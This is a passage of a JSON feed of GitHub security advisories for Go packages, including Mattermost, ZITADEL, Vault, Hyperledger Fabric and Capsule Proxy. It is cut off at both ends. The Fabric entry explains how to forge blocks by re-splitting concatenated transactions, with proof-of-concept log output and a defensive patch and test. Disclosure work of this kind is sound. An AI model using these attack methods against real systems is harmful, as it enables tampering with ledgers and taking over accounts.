[{"introduced": "0"}, {"fixed": "0.46.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-8pgv-569h-w5rw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47108"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4322"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/commit/b44dfc9092b157625a5815cb437583cee663333b"}, {"type": "PACKAGE", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/blob/9d4eb7e7706038b07d33f83f76afbe13f53d171d/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go#L327"}, {"type": "WEB", "url": "https://github.com/open-telemetry/opentelemetry-go-contrib/blob/instrumentation/google.golang.org/grpc/otelgrpc/v0.45.0/instrumentation/google.golang.org/grpc/otelgrpc/config.go#L138"}, {"type": "WEB", "url": "https://pkg.go.dev/go.opentelemetry.io/otel/metric/noop#NewMeterProvider"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-12T15:55:39Z", "nvd_published_at": "2023-11-10T19:15:16Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w496-f5qq-m58j", "modified": "2023-11-23T01:40:53Z", "published": "2023-11-06T18:30:19Z", "aliases": ["CVE-2023-5969"], "summary": "Mattermost vulnerable to excessive memory consumption", "details": "Mattermost fails to properly sanitize the request to\u00a0`/api/v4/redirect_location` allowing an\u00a0attacker,\u00a0sending a specially crafted request to `/api/v4/redirect_location`,\u00a0to fill up the memory due to caching large items.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.1"}]}], "versions": ["9.0.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5969"}, {"type": "WEB", "url": "https://github.com/mattermost/mattermost/pull/24429"}, {"type": "WEB", "url": "https://github.com/mattermost/mattermost/commit/77f094c7ee8c7a00be01c2df72f948a62c690b66"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-08T15:00:48Z", "nvd_published_at": "2023-11-06T16:15:42Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rjjm-x32p-m3f7", "modified": "2023-11-12T15:56:48Z", "published": "2023-11-12T15:56:48Z", "aliases": [], "summary": "gnark's range checker gadget allows wider inputs up to word alignment", "details": "### Impact\n\ngnark provides a gadget in the standard library to allow optimized checking of the bitwidth of the inputs. The gadget works by constructing a fixed lookup table containing all valid entries, partitioning the input and checking that all parts are inside the lookup table. The range checker gadget did not take into account that the highest partition may be less than the width limit, allowing the inputs to be up to 16 bits wider than checked.\n\nRange checking gadget is extensively used in field emulation. Users using any dependant gadget (ECDSA verification, proof recursion etc.) is impacted.\n\nWe consider the impact of the vulnerability being low as the number of attacker-modifiable bits is significantly smaller compared to the bit-width of scalar field modulus and it won't be possible to construct inputs which would allow to overflow the scalar field.\n\n### Patches\n\nThe issue has been patched in the stable branch of gnark. \n\nDue to low severity of the issue no emergency release will be issued and we follow the existing release plan. Versions v0.9.2 and higher are patched.\n\n### Workarounds\n\nWe consider the issue very hard to exploit and do not recommend manual remediation. However, it is possible to perform manual bit decomposition using `std/math/bits` gadget.\n\n### References\n\nInitial issue https://github.com/Consensys/gnark/issues/897\n\n### Acknowledgement\n\nThe issue was reported by [@ultrainstinct30](https://github.com/ultrainstinct30).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/consensys/gnark"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-rjjm-x32p-m3f7"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark/issues/897"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark/commit/f528807119e9443df94b8c01fe8ee65abe3c75d8"}, {"type": "PACKAGE", "url": "https://github.com/Consensys/gnark"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-11-12T15:56:48Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2wmj-46rj-qm2w", "modified": "2023-11-30T15:03:20Z", "published": "2023-11-29T21:32:51Z", "aliases": ["CVE-2023-49097"], "summary": "ZITADEL Account Takeover via Malicious Host Header Injection", "details": "### Impact\n\nZITADEL uses the notification triggering requests Forwarded or X-Forwarded-Host header to build the button link sent in emails for confirming a password reset with the emailed code. If this header is overwritten and a user clicks the link to a malicious site in the email, the secret code can be retrieved and used to reset the users password and take over his account.\n\nAccounts with MFA or Passwordless enabled can not be taken over by this attack.\n\n### Patches\n\nThe patched ZITADEL versions verify, that the auth requests instance is retrieved by the requests original domain (from the Forwarded or X-Forwarded-Host headers if available). If the instance can't be found using the original host or the auth request can't be found within that instance, ZITADEL throws an error.\n\n2.x versions are fixed on >= [2.41.6](https://github.com/zitadel/zitadel/releases/tag/v2.41.6)\n2.40.x versions are fixed on >= [2.40.10](https://github.com/zitadel/zitadel/releases/tag/v2.40.10)\n2.39.x versions are fixed on >= [2.39.9](https://github.com/zitadel/zitadel/releases/tag/v2.39.9)\n\nThe vulnerablility was introduced with 2.39.0.\n\n### Workarounds\n\nA ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.\n\n### References\n\nNone\n\n### Questions\n\nIf you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.39.0"}, {"fixed": "2.39.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.40.0"}, {"fixed": "2.40.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.41.0"}, {"fixed": "2.41.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/zitadel/zitadel/security/advisories/GHSA-2wmj-46rj-qm2w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49097"}, {"type": "PACKAGE", "url": "https://github.com/zitadel/zitadel"}], "database_specific": {"cwe_ids": ["CWE-640"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-29T21:32:51Z", "nvd_published_at": "2023-11-30T05:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4ghx-8jw8-p76q", "modified": "2023-11-28T20:48:08Z", "published": "2023-11-27T12:30:54Z", "aliases": ["CVE-2023-47168"], "summary": "Mattermost Open Redirect vulnerability", "details": "Mattermost fails to properly check a redirect URL parameter allowing for an\u00a0open redirect was possible when the user clicked \"Back to Mattermost\" after providing a invalid custom url scheme in /oauth/{service}/mobile_login?redirect_to=\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.1.0"}, {"fixed": "9.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47168"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:48:08Z", "nvd_published_at": "2023-11-27T10:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4qhc-v8r6-8vwm", "modified": "2023-11-17T22:01:34Z", "published": "2023-11-09T21:30:39Z", "aliases": ["CVE-2023-5954"], "summary": "HashiCorp Vault Missing Release of Memory after Effective Lifetime vulnerability", "details": "HashiCorp Vault and Vault Enterprise inbound client requests triggering a policy check can lead to an unbounded consumption of memory. A large number of these requests may lead to denial-of-service. Fixed in Vault 1.15.2, 1.14.6, and 1.13.10.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0"}, {"fixed": "1.15.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5954"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-33-vault-requests-triggering-policy-checks-may-lead-to-unbounded-memory-consumption/59926"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20231227-0001/"}], "database_specific": {"cwe_ids": ["CWE-401"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-10T00:43:02Z", "nvd_published_at": "2023-11-09T21:15:25Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v9w2-543f-h69m", "modified": "2023-11-14T21:37:09Z", "published": "2023-11-14T20:28:34Z", "aliases": ["CVE-2023-46132"], "summary": "Fabric vulnerable to crosslinking transaction attack", "details": "# Short summary\n\nCombining two molecules to one another, called \"cross-linking\" results in a molecule with a chemical formula that is composed of all atoms of the original two molecules. \n\nIn Fabric, one can take a block of transactions and cross-link the transactions in a way that alters the way the peers parse the transactions. If a first peer receives a block `B` and a second peer receives a block identical to `B` but with the transactions being cross-linked, the second peer will parse transactions in a different way and thus its world state will deviate from the first peer. \n\nOrderers or peers cannot detect that a block has its transactions cross-linked, because there is a vulnerability in the way Fabric hashes the transactions of blocks. It simply and naively concatenates them, which is insecure and lets an adversary craft a \"cross-linked block\" (block with cross-linked transactions) which alters the way peers process transactions. \nFor example, it is possible to select a transaction and manipulate a peer to completely avoid processing it, without changing the computed hash of the block.\n\nAdditional validations have been added in v2.2.14 and v2.5.5 to detect potential cross-linking issues before processing blocks.\n\n## Impact\nIn V1 and V2, we only have a crash fault tolerant orderer and as such, the security model Fabric operates in is that the orderer is honest,\nbut peers may be malicious. As such, a peer that replicates a block from a malicious peer can have a state fork.\n\nIn V3 which we did not a release a GA yet (only a preview), we have a byzantine fault tolerant orderering service, so the security model that Fabric operates in such a case includes malicious orderers. If the orderer is malicious, it can cause state forks for peers, and can infect non-malicious orderers with cross-linked blocks.\n\n# Long summary\n\nIn order to create a signature on a big chunk of data  such as a block, the data needs to be \"compressed\" first to the input size of the signature algorithm.\n\nIn Fabric's case, we use a hash function which compressed a Fabric block from arbitrary size to a 32 byte string.\n\nIn order to understand the problem we need to be more specific: The block structure has three parts to it: (1) Header, (2) Transactions, and (3) Metadata.\n\nWhen hashing the block, the header and metadata are stitched together and then hashed, and this hash of the header and the metadata is what signed (it's a simplification but let's not get into details)\n\nHowever, the transactions of the block are not part of the above hash. Instead, the header contains a hash, called the \"Data hash\" and despite the fact that in the comments it is said: \"// The hash of the BlockData, by MerkleTree\", actually it is far from being the case, and that is where our problem lies.\n\nThe problem is that the way the transactions are hashed gives an attacker some freedom in manipulating the data. \n\nTo create the Data Hash, the transactions in the block are concatenated to one another, creating a big long byte array and then this big long byte array is hashed, and this is essentially the Data Hash.\n\nThe transactions in the block are a list of raw byte arrays, and when they are concatenated they look like this:\n\n`|$$$$$$$$$$$$|*************|@@@@@@@@@@@@|%%%%%%%%%|`  (The vertical lines \" | \" represent how transactions are separated in a block.)\n\nWhen the transactions are concatenated in order to be hashed, the payload that is hashed is: \n`$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%`\n\nAn adversary can't change the bytes of the concatenation, however what it can do, is to modify how transactions are encoded in the block:\n\nFor example, consider an adversary wants to manipulate a peer to skip the second transaction (******).\n\nIt can then create a block with the transactions as follows:\n\n`|$$$$$$$$$$$$*************|@@@@@@@@@@@@|%%%%%%%%%| `\n\nNotice that a block with the above transactions has the same concatenation of bytes as the original block, but the block has one less transaction - the first transaction is a concatenation of the first and second transactions in the original block.\n\nWhen the peer receives this block, it looks at the first transaction and when it parses it, it completely ignores the ***** bytes, (we will see why soon), and so, an adversary can create a block with the same hash but different transactions and this would create a fork in the network.\n \nI made a small PoC where I created a block with 2 transactions (by invoking two chaincodes at the same time) with a Raft orderer:\n\n```\n    [e][OrdererOrg.orderer] 2023-10-14 23:07:34.076 CEST 0079 INFO [orderer.consensus.etcdraft] propose -> Created block [10] with 2 transactions, there are 0 blocks in flight channel=testchannel node=1\n```\n\nBut right after creating the block, I just modified only its transaction content (without modifying the block hash) and then the peers only detect a single transaction inside that block:\n \n```\n    [e][Org2.peer0] 2023-10-14 23:07:34.079 CEST 0099 INFO [kvledger] commit -> [testchannel] Committed block [10] with 1 transaction(s) in 0ms (state_validation=0ms block_and_pvtdata_commit=0ms state_commit=0ms) commitHash=[c5ecca818da9319af2f276dd01cd1337938f20c3535dd23f95a33933a114fe84]\n```\n\nThe important takeaway from this experiment is that the peer does not detect any tempering was done to the block. If an attacker performs this attack, the network can be forked silently and no one will notice the network was forked until it's too late.\n\n \n\n# Patches\nHere is the patch I propose (the explanation is further below): \n\n```\ndiff --git a/internal/peer/gossip/mcs.go b/internal/peer/gossip/mcs.go\nindex b46df8b6a..9c3b5c8fd 100644\n--- a/internal/peer/gossip/mcs.go\n+++ b/internal/peer/gossip/mcs.go\n@@ -150,6 +150,10 @@ func (s *MSPMessageCryptoService) VerifyBlock(chainID common.ChannelID, seqNum u\n \t\treturn fmt.Errorf(\"Block with id [%d] on channel [%s] does not have metadata. Block not valid.\", block.Header.Number, chainID)\n \t}\n \n+\tif err := protoutil.VerifyTransactionsAreWellFormed(block); err != nil {\n+\t\treturn err\n+\t}\n+\n \t// - Verify that Header.DataHash is equal to the hash of block.Data\n \t// This is to ensure that the header is consistent with the data carried by this block\n \tif !bytes.Equal(protoutil.BlockDataHash(block.Data), block.Header.DataHash) {\ndiff --git a/orderer/common/cluster/util.go b/orderer/common/cluster/util.go\nindex e229bebfc..05b1bfaa9 100644\n--- a/orderer/common/cluster/util.go\n+++ b/orderer/common/cluster/util.go\n@@ -260,6 +260,9 @@ func VerifyBlockHash(indexInBuffer int, blockBuff []*common.Block) error {\n \tif block.Header == nil {\n \t\treturn errors.New(\"missing block header\")\n \t}\n+\tif err := protoutil.VerifyTransactionsAreWellFormed(block); err != nil {\n+\t\treturn err\n+\t}\n \tseq := block.Header.Number\n \tdataHash := protoutil.BlockDataHash(block.Data)\n \t// Verify data hash matches the hash in the header\ndiff --git a/orderer/consensus/smartbft/verifier.go b/orderer/consensus/smartbft/verifier.go\nindex 2b9fdfc4c..f232a1eae 100644\n--- a/orderer/consensus/smartbft/verifier.go\n+++ b/orderer/consensus/smartbft/verifier.go\n@@ -237,6 +237,10 @@ func verifyHashChain(block *cb.Block, prevHeaderHash string) error {\n \t\treturn errors.Errorf(\"previous header hash is %s but expected %s\", thisHdrHashOfPrevHdr, prevHeaderHash)\n \t}\n \n+\tif err := protoutil.VerifyTransactionsAreWellFormed(block); err != nil {\n+\t\treturn err\n+\t}\n+\n \tdataHash := hex.EncodeToString(block.Header.DataHash)\n \tactualHashOfData := hex.EncodeToString(protoutil.BlockDataHash(block.Data))\n \tif dataHash != actualHashOfData {\ndiff --git a/protoutil/blockutils.go b/protoutil/blockutils.go\nindex 8527869e4..fca3c386f 100644\n--- a/protoutil/blockutils.go\n+++ b/protoutil/blockutils.go\n@@ -10,6 +10,7 @@ import (\n \t\"bytes\"\n \t\"crypto/sha256\"\n \t\"encoding/asn1\"\n+\t\"encoding/base64\"\n \t\"fmt\"\n \t\"math/big\"\n \n@@ -298,3 +299,35 @@ func searchConsenterIdentityByID(consenters []*cb.Consenter, identifier uint32)\n \t}\n \treturn nil\n }\n+\n+func VerifyTransactionsAreWellFormed(block *cb.Block) error {\n+\tif block == nil || block.Data == nil || len(block.Data.Data) == 0 {\n+\t\treturn nil\n+\t}\n+\n+\tfor i, rawTx := range block.Data.Data {\n+\t\tenv := &cb.Envelope{}\n+\t\tif err := proto.Unmarshal(rawTx, env); err != nil {\n+\t\t\treturn fmt.Errorf(\"transaction %d is invalid: %v\", i, err)\n+\t\t}\n+\n+\t\tif len(env.Payload) == 0 {\n+\t\t\treturn fmt.Errorf(\"transaction %d has no payload\", i)\n+\t\t}\n+\n+\t\tif len(env.Signature) == 0 {\n+\t\t\treturn fmt.Errorf(\"transaction %d has no signature\", i)\n+\t\t}\n+\n+\t\texpected := MarshalOrPanic(env)\n+\t\tif len(expected) < len(rawTx) {\n+\t\t\treturn fmt.Errorf(\"transaction %d has %d trailing bytes\", i, len(rawTx)-len(expected))\n+\t\t}\n+\t\tif !bytes.Equal(expected, rawTx) {\n+\t\t\treturn fmt.Errorf(\"transaction %d (%s) does not match its raw form (%s)\", i,\n+\t\t\t\tbase64.StdEncoding.EncodeToString(expected), base64.StdEncoding.EncodeToString(rawTx))\n+\t\t}\n+\t}\n+\n+\treturn nil\n+}\ndiff --git a/protoutil/blockutils_test.go b/protoutil/blockutils_test.go\nindex b2159da9f..2871483f1 100644\n--- a/protoutil/blockutils_test.go\n+++ b/protoutil/blockutils_test.go\n@@ -489,3 +489,109 @@ func TestBlockSignatureVerifierByCreator(t *testing.T) {\n \trequire.Len(t, signatureSet, 1)\n \trequire.Equal(t, []byte(\"creator1\"), signatureSet[0].Identity)\n }\n+\n+func TestVerifyTransactionsAreWellFormed(t *testing.T) {\n+\toriginalBlock := &cb.Block{\n+\t\tData: &cb.BlockData{\n+\t\t\tData: [][]byte{\n+\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\tPayload:   []byte{1, 2, 3},\n+\t\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t\t}),\n+\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\tPayload:   []byte{7, 8, 9},\n+\t\t\t\t\tSignature: []byte{10, 11, 12},\n+\t\t\t\t}),\n+\t\t\t},\n+\t\t},\n+\t}\n+\n+\tforgedBlock := proto.Clone(originalBlock).(*cb.Block)\n+\ttmp := make([]byte, len(forgedBlock.Data.Data[0])+len(forgedBlock.Data.Data[1]))\n+\tcopy(tmp, forgedBlock.Data.Data[0])\n+\tcopy(tmp[len(forgedBlock.Data.Data[0]):], forgedBlock.Data.Data[1])\n+\tforgedBlock.Data.Data = [][]byte{tmp} // Replace transactions {0,1} with transaction {0 || 1}\n+\n+\tfor _, tst := range []struct {\n+\t\tname          string\n+\t\texpectedError string\n+\t\tblock         *cb.Block\n+\t}{\n+\t\t{\n+\t\t\tname: \"empty block\",\n+\t\t},\n+\t\t{\n+\t\t\tname:  \"no block data\",\n+\t\t\tblock: &cb.Block{},\n+\t\t},\n+\t\t{\n+\t\t\tname:  \"no transactions\",\n+\t\t\tblock: &cb.Block{Data: &cb.BlockData{}},\n+\t\t},\n+\t\t{\n+\t\t\tname: \"single transaction\",\n+\t\t\tblock: &cb.Block{Data: &cb.BlockData{Data: [][]byte{marshalOrPanic(&cb.Envelope{\n+\t\t\t\tPayload:   []byte{1, 2, 3},\n+\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t})}}},\n+\t\t},\n+\t\t{\n+\t\t\tname:  \"good block\",\n+\t\t\tblock: originalBlock,\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"forged block\",\n+\t\t\tblock:         forgedBlock,\n+\t\t\texpectedError: \"transaction 0 has 10 trailing bytes\",\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"no signature\",\n+\t\t\texpectedError: \"transaction 0 has no signature\",\n+\t\t\tblock: &cb.Block{\n+\t\t\t\tData: &cb.BlockData{\n+\t\t\t\t\tData: [][]byte{\n+\t\t\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\t\t\tPayload: []byte{1, 2, 3},\n+\t\t\t\t\t\t}),\n+\t\t\t\t\t},\n+\t\t\t\t},\n+\t\t\t},\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"no payload\",\n+\t\t\texpectedError: \"transaction 0 has no payload\",\n+\t\t\tblock: &cb.Block{\n+\t\t\t\tData: &cb.BlockData{\n+\t\t\t\t\tData: [][]byte{\n+\t\t\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t\t\t\t}),\n+\t\t\t\t\t},\n+\t\t\t\t},\n+\t\t\t},\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"transaction invalid\",\n+\t\t\texpectedError: \"transaction 0 is invalid: proto: cannot parse invalid wire-format data\",\n+\t\t\tblock: &cb.Block{\n+\t\t\t\tData: &cb.BlockData{\n+\t\t\t\t\tData: [][]byte{\n+\t\t\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\t\t\tPayload:   []byte{1, 2, 3},\n+\t\t\t\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t\t\t\t})[9:],\n+\t\t\t\t\t},\n+\t\t\t\t},\n+\t\t\t},\n+\t\t},\n+\t} {\n+\t\tt.Run(tst.name, func(t *testing.T) {\n+\t\t\terr := protoutil.VerifyTransactionsAreWellFormed(tst.block)\n+\t\t\tif tst.expectedError == \"\" {\n+\t\t\t\trequire.NoError(t, err)\n+\t\t\t} else {\n+\t\t\t\trequire.EqualError(t, err, tst.expectedError)\n+\t\t\t}\n+\t\t})\n+\t}\n+}\n\n```\n\nThe idea is as follows:\n\nWhen we validate that the block's transactions match the hash in the header, we not only hash the transactions are earlier, \n\nbut also ensure that if the transactions in the block are encoded into bytes, they re-create the exact split in the original block: `|$$$$$$$$$$$$|***********|@@@@@@@@@|%%%%%%%%%%%|`\n\nMore specifically, each transaction in the block is parsed and then re-encoded to bytes, and we check that the original encoding of a transaction is as the second encoding after parsing the original bytes of the transaction.\n\nThis fix keeps the legacy way of hashing transactions to create the block data hash, but also aims to check if some manipulation was done.\n\n \nTo understand why the fix works, we need to understand how protobuf, the wire protocol that Fabric uses to encode transactions (and almost anything it sends over the wire or writes to disk) encodes a transaction.\n\nA transaction is a protobuf message with two fields of bytes: (1) Payload and (2) Signature.\n\nWhen encoding a field of bytes, protobuf first writes a tag for the field (a byte) and then writes the length of the field in variable-length encoding, and then the bytes themselves.\n\nFor example, to encode a transaction, protobuf writes 10 (the tag for payload), then two bytes for the length of the payload, then the payload, and then 18, the tag for the signature, and then a single byte for the length of the signature, and finally the signature.\n\nNow, we can understand a proof sketch of why my solution works:\n\nAssume in contradiction that an adversary takes a block of transactions and changes the split of the concatenation in a way that changes the transactions for a peer:\n\nFrom `|$$$$$$$$$$$$|************|@@@@@@@@@@@|...|%%%%%%%|` to (for example): From `|$$$$$$$$$$$$************|@@@@@@@@@@@|...|%%%%%%%|` \n\nSince this split is not identical to the original split, there exists at least one transaction index of different size between the two splits. Let's look at the first transaction that is of different size.\n\nFor example, for the split:\n\n`|$$$$$$$$$$$$|************|@@@@@@@@@@@|...|%%%%%%%|`  we have two options:\n\n1.  The first transaction of different size is smaller in the new split:  `|$$$$$$$$$$$$|*****|*******|@@@@@@@@@@@|...|%%%%%%%|`  In such a case, it must contain both a payload and a signature, so it needs two fields (we can say we will return an error if one of the two is missing). If the protobuf parser detects it lacks bytes to parse a payload, it will fail with an error. Else, it has enough bytes to parse the payload, and then the signature is parsed. If the signature field is too short then we also error similarly.\n\n2. The first transaction of different size is bigger in the new split: `|$$$$$$$$$$$$|************@@@@|@@@@@@@|...|%%%%%%%|` \nIn that case, once this transaction is parsed, the extra bytes are skipped, so encoding the transaction to bytes yields a shorter byte array, and we detect a tempering.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0-alpha"}, {"fixed": "2.2.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.5.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hyperledger/fabric/security/advisories/GHSA-v9w2-543f-h69m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46132"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/4503"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/4504"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/commit/389b2e66de9a6fbc6043216d554c97bbbdf0e008"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/commit/93bef10bd3ce3c54d7f3b064f765dbde61da7def"}, {"type": "PACKAGE", "url": "https://github.com/hyperledger/fabric"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/releases/tag/v2.2.14"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/releases/tag/v2.5.5"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-14T20:28:34Z", "nvd_published_at": "2023-11-14T21:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9jjc-grg5-67gj", "modified": "2023-11-28T21:00:28Z", "published": "2023-11-24T15:30:28Z", "aliases": ["CVE-2023-46575"], "summary": "SQL injection vulnerability in Meshery", "details": "A SQL injection vulnerability in Meshery before 0.6.179 allows a remote attacker to obtain sensitive information and execute arbitrary code via the order parameter.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/layer5io/meshery"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.179"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46575"}, {"type": "WEB", "url": "https://github.com/meshery/meshery/pull/9372"}, {"type": "WEB", "url": "https://github.com/meshery/meshery/commit/ffe00967acfe4444a5db08ff3a4cafb9adf6013f"}, {"type": "PACKAGE", "url": "https://github.com/meshery/meshery"}, {"type": "WEB", "url": "https://github.com/meshery/meshery/compare/v0.6.178...v0.6.179"}, {"type": "WEB", "url": "https://meshery.io"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-11-24T19:01:37Z", "nvd_published_at": "2023-11-24T14:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fpvw-6m5v-hqfp", "modified": "2023-11-27T22:07:37Z", "published": "2023-11-24T16:53:25Z", "aliases": ["CVE-2023-48312"], "summary": "Capsule Proxy Authentication bypass using an empty token", "details": "The privilege escalation is based on a missing check if the user is authenticated based on the `TokenReview` result.\n\nAll the clusters running with the `anonymous-auth` Kubernetes API Server setting disable (set to `false`) are affected since it would be possible to bypass the token review mechanism, interacting with the upper Kubernetes API Server.\n\n# PoC\n\nStart a KinD cluster with the `anonymous-auth` value to `false`. \nIf it is true, it uses anonymous permissions which are very limited by 